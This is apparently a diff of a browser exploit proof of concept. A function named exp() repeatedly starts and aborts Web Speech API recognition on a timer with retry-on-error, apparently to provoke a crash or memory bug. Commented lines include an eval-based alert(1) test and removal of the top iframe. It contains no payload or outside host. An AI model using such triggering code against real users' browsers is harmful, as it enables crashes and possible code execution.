@@ -37,16 +37,15 @@ function exp() {
   
   //for (var i =0; i<0x90000000;i++)
   
-  try{recognition.start();}catch(e){recognition.abort();}
+  try{recognition.start();}catch(e){recognition.abort(); try{recognition.start();}catch(e){} }
   //for (var i =0; i<1000000;i++){};
   //for (var i =0; i<1000000;i++){};
   //recognition.abort();	
   //eval("recognition.stop(); alert(1);");
-  var inn = getRndInteger(0,600)
-  timer = setTimeout('recognition.abort();', inn);
-  console.log("dick " + inn);
-  index = index+1;
-  //alert(1);
+  //var inn = getRndInteger(0,600)
+  //timer = setTimeout('recognition.abort();', inn);
+  //console.log("dick " + inn);
+
 }
 window.setInterval(exp, 3000);
 
@@ -85,6 +84,6 @@ recognition.onend = function() {
 recognition.onerror = function(event) {
   diagnostic.textContent = 'Error occurred in recognition: ' + event.error;
   console.log("dick onerror");
-  //recognition.abort();
+  try{recognition.abort();}catch(e){} 
   //top.document.querySelector('iframe').remove();
 }
